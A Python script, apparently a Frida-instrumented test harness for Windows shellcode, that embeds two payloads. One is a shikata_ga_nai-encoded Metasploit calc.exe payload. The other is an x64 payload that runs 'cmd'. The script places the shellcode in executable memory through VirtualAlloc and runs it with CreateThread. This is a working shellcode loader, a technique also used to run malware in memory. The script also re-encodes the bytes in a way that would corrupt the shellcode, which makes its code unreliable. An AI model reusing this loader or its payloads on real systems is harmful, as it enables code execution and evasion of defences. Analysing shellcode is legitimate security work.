import ctypes
import ctypes.wintypes as wt
import sys
import frida
import os

# Shellcode
# x86/shikata_ga_nai succeeded with size 227 (iteration=1)
# Metasploit windows/exec calc.exe
shellcode = bytearray(
"\x40\x27\x98\x99\x99\x98\x41\x4a\x9f\xd6\x98\x40\x37\x98\x4f\x90"
"\xf5\x42\x47\x37\x47\x37\x4b\xf5\x49\xf8\x4a\x9b\x4e\x49\x2f\x90"
"\x9b\x37\x98\x99\x48\x41\x91\x90\x41\xf5\x9f\x93\x96\x2f\x49\x42"
"\x43\x92\xfc\x42\x4b\x4b\xf5\x93\x4b\x4e\x47\x48\x47\x91\x99\x97"
"\x9b\xf9\x46\xf9\x47\x96\x93\x98\xfd\xf8\x4b\x40\xfd\x98\x93\x91"
"\x90\x43\x91\x93\x96\x90\x4e\xf9\xf9\x41\x91\x43\x9f\xf8\xf9\x40"
"\x92\xf9\x90\x37\x42\x2f\xfc\x46\x4a\x27\x93\x37\x48\x90\x90\x46"
"\x46\x92\xf8\x40\x47\xf9\x99\xf8\x9f\x4b\xf9\x42\x98\x37\xd6\x2f"
"\xfd\x97\x4b\x47\x90\x91\x42\x43\x49\x93\x92\x9b\x9f\x9f\x4f\x42"
"\x3f\x96\x9b\xf8\x43\x93\x4b\xf9\x4b\x2f\x98\x46\x37\x9b\x47\x48"
"\x48\x90\x43\x41\xfd\x4f\x46\x90\xf9\xfc\x97\x98\x98\x43\xfc\xf9"
"\x96\x40\x4e\xfc\x49\x99\x3f\x2f\x49\x41\x93\xf8\x99\x9f\x37\x37"
"\x98\x48\xfc\x97\x4b\x97\x43\x40\x4b\xf8\x43\xf5\x92\x47\x97\xf5"
"\xfd\xd6\x99\x47\xfc\x97\x96\x43\x48\x90\x37\x27\x91\x42\x47\xfd"
"\x40\xd6\x49\x93\x4a\x46\x43\x49\x41\x99\x37\xfd\xf8\x43\xf5\xd6"
"\x37\x4a\x27\x99\x46\xfc\x48\x43\x48\x47\x91\x4b\x47\x9b\x96\x48"
"\x4b\x98\xf9\x93\x48\x9f\x4b\x42\x2f\xfd\x99\x27\x48\x41\x4e\x91"
"\xfd\x96\x43\x41\x4b\x99\xf9\x96\xf9\x2f\x3f\x91\x43\x96\xfd\xf8"
"\x4e\x3f\x2f\x2f\x42\x92\x40\x92\x43\x27\x47\x99\x41\xf5\x3f\x92"
"\x3f\x4a\xfc\x46\x49\x49\x48\x99\x37\x49\x2f\xfc\xf5\x42\x97\x46"
"\xfc\x98\x4b\x9f\x9f\x4f\x90\x48\x42\xfd\xfd\xf5\x9f\x41\x49\x43"
"\x4b\x93\x9f\x2f\x41\x9f\x98\x92\x40\x96\x49\x98\x46\x92\x41\xfc"
"\x96\x4f\x43\x40\x98\x47\xf5\x48\x99\x3f\x2f\x93\x46\x40\x43\x37"
"\x48\xf9\x91\x4a\x96\x40\x91\x47\x41\x96\x47\x37\x92\x4e\x93\xf5"
"\xfd\x43\x90\x3f\xf9\x37\x40\x9b\x9b\x48\x9b\x4f\x92\x9f\x2f\x4b"
"\x2f\x99\x9b\x37\xf9\xf8\x4e\x4f\x9b\x3f\x4b\x97\x97\x4e\x9b\x47"
"\xf8\x96\xfd\xf5\x43\xf8\x3f\x46\x3f\x47\x46\x93\x41\x37\x98\x93"
"\x43\x98\x2f\x99\xf5\xfd\x4e\xf9\x9b\x37\x42\x4f\x98\xfc\x97\x40"
"\x97\x40\x4e\x4a\x91\x41\xf8\x4e\xf9\x93\x99\x96\x49\x90\x48\xf5"
"\xd6\x97\x3f\x98\x9b\x42\x4e\x4e\x92\x4e\x37\x48\x48\x4e\x42\x4a"
"\xf9\x4b\x4a\x90\x2f\xf8\x37\x97\xd6\x48\x47\x4a\x4f\x96\x9b\x98"
"\x98\x3f\xf5\x47\xf5\x98\x92\x41\x47\x4b\x93\x40\x40\x49\xfc\x4a"
"\x4e\x98\xd6\x42\x43\x43\x47\x4a\x46\xf5\x42\x2f\x42\x40\x96\x41"
"\x4e\x99\x3f\xfc\x93\x9b\x40\x99\x41\xf8\x90\xf8\x40\xd6\x47\x91"
"\x48\x90\x40\x90\xd6\x9f\x49\x43\x46\x4b\xf9\x9b\xf8\x2f\x9b\x9f"
"\x4f\xf8\x40\xf9\x4e\x3f\x92\x27\x90\x99\x96\xf9\x96\xf9\x9f\xfc"
"\x27\x27\x41\x42\x2f\xfc\x47\x48\x42\x40\x4f\x3f\xfc\x99\x4e\x2f"
"\x37\xf8\x46\x97\x9f\x42\x42\x3f\x37\x41\x4f\xfd\x99\x96\x42\x91"
"\x49\x4e\x92\x4e\x98\x4b\x42\x96\x41\x4e\xfd\x48\x90\x9f\x4b\x4e"
"\x4a\xf8\x4f\x47\xd6\x98\x37\x93\xf9\x97\xf8\x27\x3f\x96\x47\x99"
"\x99\x47\x97\x92\x4a\x43\x93\x41\xd6\x4f\x41\x40\xfc\xfd\x3f\x9b"
"\xdb\xd4\xd9\x74\x24\xf4\x58\xbf\x64\x91\xf3\x55\x2b\xc9\xb1\x56"
"\x83\xc0\x04\x31\x78\x14\x03\x78\x70\x73\x06\xa9\x90\xf1\xe9\x52"
"\x60\x96\x60\xb7\x51\x96\x17\xb3\xc1\x26\x53\x91\xed\xcd\x31\x02"
"\x66\xa3\x9d\x25\xcf\x0e\xf8\x08\xd0\x23\x38\x0a\x52\x3e\x6d\xec"
"\x6b\xf1\x60\xed\xac\xec\x89\xbf\x65\x7a\x3f\x50\x02\x36\xfc\xdb"
"\x58\xd6\x84\x38\x28\xd9\xa5\xee\x23\x80\x65\x10\xe0\xb8\x2f\x0a"
"\xe5\x85\xe6\xa1\xdd\x72\xf9\x63\x2c\x7a\x56\x4a\x81\x89\xa6\x8a"
"\x25\x72\xdd\xe2\x56\x0f\xe6\x30\x25\xcb\x63\xa3\x8d\x98\xd4\x0f"
"\x2c\x4c\x82\xc4\x22\x39\xc0\x83\x26\xbc\x05\xb8\x52\x35\xa8\x6f"
"\xd3\x0d\x8f\xab\xb8\xd6\xae\xea\x64\xb8\xcf\xed\xc7\x65\x6a\x65"
"\xe5\x72\x07\x24\x61\xb6\x2a\xd7\x71\xd0\x3d\xa4\x43\x7f\x96\x22"
"\xef\x08\x30\xb4\x66\x1e\xc3\x6a\xc0\x4f\x3d\x8b\x30\x59\xfa\xdf"
"\x60\xf1\x2b\x60\xeb\x01\xd3\xb5\x81\x0b\x43\xf6\xfd\x0d\x18\x9e"
"\xff\x0d\x0f\x38\x76\xeb\x7f\x96\xd8\xa4\x3f\x46\x98\x14\xa8\x8c"
"\x17\x4a\xc8\xae\xf2\xe3\x63\x41\xaa\x5c\x1c\xf8\xf7\x17\xbd\x05"
"\x22\x52\xfd\x8e\xc6\xa2\xb0\x66\xa3\xb0\xa5\x10\x4b\x49\x36\xb5"
"\x4b\x23\x32\x1f\x1c\xdb\x38\x46\x6a\x44\xc2\xad\xe9\x83\x3c\x30"
"\xdb\xf8\x0b\xa6\x63\x97\x73\x26\x63\x67\x22\x2c\x63\x0f\x92\x14"
"\x30\x2a\xdd\x80\x25\xe7\x48\x2b\x1f\x5b\xda\x43\x9d\x82\x2c\xcc"
"\x5e\xe1\x2e\x0b\xa0\x77\x19\xb4\xc8\x87\x19\x44\x08\xe2\x99\x14"
"\x60\xf9\xb6\x9b\x40\x02\x1d\xf4\xc8\x89\xf0\xb6\x69\x8d\xd8\x17"
"\x37\x8e\xef\x83\xc8\xf5\x80\x34\x29\x0a\x89\x50\x2a\x0a\xb5\x66"
"\x17\xdc\x8c\x1c\x56\xdc\xaa\x2f\xed\x41\x9a\xa5\x0d\xd5\xdc\xef\x0a", 'utf8')

shellcode = bytearray("\x99\x65\x48\x8b\x42\x60\x48\x8b\x40\x18\x48"
"\x8b\x70\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x48\x31\xdb\x48\x31"
"\xf6\x8b\x5f\x3c\x48\x01\xfb\xb2\x88\x8b\x1c\x13\x48\x01\xfb\x8b\x73"
"\x1c\x48\x01\xfe\x99\x66\xba\x27\x05\x8b\x04\x96\x48\x01\xf8\xeb\x17"
"\x59\x99\x48\xff\xc2\xff\xd0\x99\x66\xba\x29\x01\x8b\x04\x96\x48\x01"
"\xf8\x48\x31\xc9\xff\xd0\xe8\xe4\xff\xff\xff\x63\x6d\x64", 'utf8')

def on_message(message, data):
	print("[{}] -> {}".format(message, data))

def main():
    pid = os.getpid()
    session = frida.attach(pid)
    # attach to the session
    with open("shellcode-hooks.js") as fp:
        script_js = fp.read()

    script = session.create_script(script_js, name="shellcode-hooks.js")
    
    script.on('message', on_message)
    script.load()
    
    size = len(shellcode) * ctypes.sizeof(ctypes.c_byte)

    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(size),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t
    ctypes.windll.kernel32.RtlCopyMemory(ctypes.c_void_p(ptr),
                                         buf,
                                         ctypes.c_size_t(len(shellcode)))
     

    tid = wt.DWORD()
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(4), # create a suspended thread
                                             ctypes.byref(tid))

    ctypes.windll.kernel32.ResumeThread(ctypes.c_int(ht))

    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
    
    session.detach()

if __name__ == '__main__':
    main()